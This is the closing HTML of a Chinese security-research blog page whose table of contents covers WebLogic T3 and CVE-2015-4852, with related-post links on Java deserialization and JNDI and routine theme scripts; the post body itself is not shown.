href="/2024/04/02/thinkphp%E5%85%A8%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/" title="thinkphp全版本漏洞复现总结"><img class="cover" src="/assets/sbpk/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">thinkphp全版本漏洞复现总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/14/Java%E7%9A%84URLDNS%E9%93%BE/" title="JAVA反序列化基础和URLDNS链"><img class="cover" src="/assets/blr/11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">JAVA反序列化基础和URLDNS链</div></div></a></div><div><a href="/2024/03/14/CC1/" title="JAVA反序列化之CC1链分析"><img class="cover" src="/assets/blr/6.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">JAVA反序列化之CC1链分析</div></div></a></div><div><a href="/2024/03/26/fastjson%E7%AF%871-%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" title="fastjson篇1-基础用法"><img class="cover" src="/assets/blr/10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-26</div><div class="title">fastjson篇1-基础用法</div></div></a></div><div><a href="/2024/03/27/fastjson%E7%AF%872-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="fastjson篇2-漏洞复现和版本绕过"><img class="cover" src="/assets/blr/11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-27</div><div class="title">fastjson篇2-漏洞复现和版本绕过</div></div></a></div><div><a href="/2024/04/01/JNDI%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%871/" title="JNDI绕过高版本jdk限制1"><img class="cover" src="/assets/blr/12.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-01</div><div class="title">JNDI绕过高版本jdk限制1</div></div></a></div><div><a href="/2024/04/01/JNDI%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%872-JDBC/" title="JNDI绕过高版本jdk限制2-JDBC"><img class="cover" src="/assets/blr/13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-01</div><div class="title">JNDI绕过高版本jdk限制2-JDBC</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/jmx0hxq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jmx0hxq</div><div class="author-info__description">总有人间一两风,填我十万八千梦</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/jmx0hxq" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3077959912@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">T3协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">3.</span> <span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/10/01/2024%20SCTF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2024SCTF出题记录"><img src="/assets/images/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024SCTF出题记录"/></a><div class="content"><a class="title" href="/2024/10/01/2024%20SCTF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2024SCTF出题记录">2024SCTF出题记录</a><time datetime="2024-09-30T17:23:49.277Z" title="发表于 2024-10-01 01:23:49">2024-10-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/31/2024%E4%BA%AC%E9%BA%92CTF%20ezldap%E5%A4%8D%E7%8E%B0/" title="2024京麒CTF ezldap复现分析"><img src="/assets/sbpk/18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024京麒CTF ezldap复现分析"/></a><div class="content"><a class="title" href="/2024/05/31/2024%E4%BA%AC%E9%BA%92CTF%20ezldap%E5%A4%8D%E7%8E%B0/" title="2024京麒CTF ezldap复现分析">2024京麒CTF ezldap复现分析</a><time datetime="2024-05-31T09:25:28.479Z" title="发表于 2024-05-31 17:25:28">2024-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/24/2024ciscn%20ezjava%E5%A4%8D%E7%8E%B0/" title="2024 CISCN ezjava复现总结"><img src="/assets/sbpk/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024 CISCN ezjava复现总结"/></a><div class="content"><a class="title" href="/2024/05/24/2024ciscn%20ezjava%E5%A4%8D%E7%8E%B0/" title="2024 CISCN ezjava复现总结">2024 CISCN ezjava复现总结</a><time datetime="2024-05-23T16:17:21.306Z" title="发表于 2024-05-24 00:17:21">2024-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/17/jdk7u21/" title="Jdk7u21链子分析"><img src="/assets/sbpk/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jdk7u21链子分析"/></a><div class="content"><a class="title" href="/2024/05/17/jdk7u21/" title="Jdk7u21链子分析">Jdk7u21链子分析</a><time datetime="2024-05-17T12:22:44.621Z" title="发表于 2024-05-17 20:22:44">2024-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/10/Jackson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Jackson漏洞总结"><img src="/assets/sbpk/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jackson漏洞总结"/></a><div class="content"><a class="title" href="/2024/05/10/Jackson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Jackson漏洞总结">Jackson漏洞总结</a><time datetime="2024-05-10T07:47:01.326Z" title="发表于 2024-05-10 15:47:01">2024-05-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Jmx0hxq</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer" data-id="1419123454" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
